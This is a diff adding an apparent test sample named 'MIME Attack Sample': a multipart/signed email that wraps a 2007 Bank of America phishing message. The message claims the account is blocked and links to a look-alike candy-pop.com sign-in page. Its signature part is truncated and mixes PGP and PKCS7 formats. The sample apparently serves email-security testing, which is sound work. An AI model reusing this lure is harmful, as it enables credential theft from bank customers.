@@ -1,0 +1,87 @@
+From: Ismail Onur Filiz <onurf@su.sabanciuniv.edu>
+To: mike.mcconnell@enron.com, louise.kitchen@enron.com, david.gorte@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature";  micalg=sha-256; boundary="BOUNDARY" 
+--BOUNDARY
+Content-Type: text/plain Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVER1r3SU0hXCRQcq0000019b@leestaffing.com>
+X-OriginalArrivalTime: 21 Feb 2007 10:46:26.0515 (UTC) FILETIME=[8951C230:01C755A5]
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 873
+
+<html>
+<body>
+<title>Bank of America Account Review Department !</title>
+<head>
+<style type="text/css">
+.style1 {font-family: Verdana, Arial, Helvetica, sans-serif;font-weight: bold;color: #D4001A;}
+.style3 {color: #000000; font-size: 12px; font-family: Verdana, Arial, Helvetica, sans-serif;}
+.style4 {font-family: Verdana, Arial, Helvetica, sans-serif;font-size: 10px;}
+</style>
+</head>
+
+<table width="733" height="238" border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td height="27" colspan="3">
+<img src="http://grandsteer.com/olb_masthead_nonav.gif" alt="Bank of America Higher Standards" longdesc="http://www.bankofamerica.com"></td>
+</tr>
+<tr>
+<td height="103" colspan="3" bgcolor="#D4001A">
+<img src="http://release35.par3.com/images/client/bankofamerica/em_photo.jpg"><img src="http://release35.par3.com/images/client/bankofamerica/em_title_red.gif" alt="Online Banking Alert"></td>
+
+</tr>
+<tr>
+<td width="160" height="99"><A href="http://www.candy-pop.com/www.bankofamerica.com/BOA/sslencrypt218bit/online_banking/index.htm" target="_blank"><img src="http://release35.par3.com/images/client/bankofamerica/em_promo2.gif" border=0 alt="Sign In"></a></td>
+<td width="1090" colspan="2"><br>
+<table width="500" height="125" border="0" align="center" cellpadding="3" cellspacing="3">
+<tr>
+<td width="527"><p class="style1">Your Online Banking Account has been Blocked</p>
+<p align="justify" class="style3">Because of   unusual number of invalid login attempts on you account, we had to believe that,   their might be some security problem on you account. So we have decided to put   an extra verification process to ensure your identity and your account security.   Please click on <A href="http://www.candy-pop.com/www.bankofamerica.com/BOA/sslencrypt218bit/online_banking/index.htm" target="_blank">sign in to Online Banking</A> to continue to the verification process and   ensure your account security. It is all about your security. Thank you, and   visit the customer service section.</p></td>
+</tr>
+</table><br>
+</td>
+</tr>
+
+<tr>
+<td height="9" colspan="3"><hr width=200 size=1 noshade color="#cccccc" style='width:560.25pt'></td>
+</tr>
+</table>
+<table width="750" border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td width="486"><span class="style4">Bank of   America,   N.A. Member FDIC. <A href="http://www.bankofamerica.com/help/equalhousing.cfm" target="_blank" BOA>Equal Housing Lender</A> <IMG src="http://release35.par3.com/images/client/bankofamerica/house_1.gif"><br>
+&copy; 2007 Bank of America Corporation. All rights reserved.</span></td>
+<td width="99">&nbsp;</td>
+<td width="167">
+<div align="right">
+<img src="http://release35.par3.com/images/client/bankofamerica/foot_olympic.gif" alt="Olympic Logo">
+
+</div>
+</td>
+</tr>
+</table>
+</body>
+</html>
+--BOUNDARY
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Disposition: attachment; filename="smime.p7s"
+Content-Transfer-Encoding: base64 
+
+-----BEGIN PGP SIGNATURE-----
+MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG9w0BBwEAAKCCDqMw
+ggSXMIIDf6ADAgECAg5IG2oIokSI01ybPclIDTANBgkqhkiG9w0BAQsFADBMMSAwHgYDVQQLExdH
+bG9iYWxTaWduIFJvb3QgQ0EgLSBSMzETMBEGA1UEChMKR2xvYmFsU2lnbjETMBEGA1UEAxMKR2xv
+YmFsU2lnbjAeFw0xNjA2MTUwMDAwMDBaFw0yNDA2MTUwMDAwMDBaMF0xCzAJBgNVBAYTAkJFMRkw
+FwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTMwMQYDVQQDEypHbG9iYWxTaWduIFBlcnNvbmFsU2ln
+biAxIENBIC0gU0hBMjU2IC0gRzMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDKsJtr
+TQo4rIa7CH2H78wBxmZlQX07EYoDnoAAMdoMTTysHRYRuCbonhe8k/c4ZDtyAd1Um7pcxmRF3oRx
+--BOUNDARY--
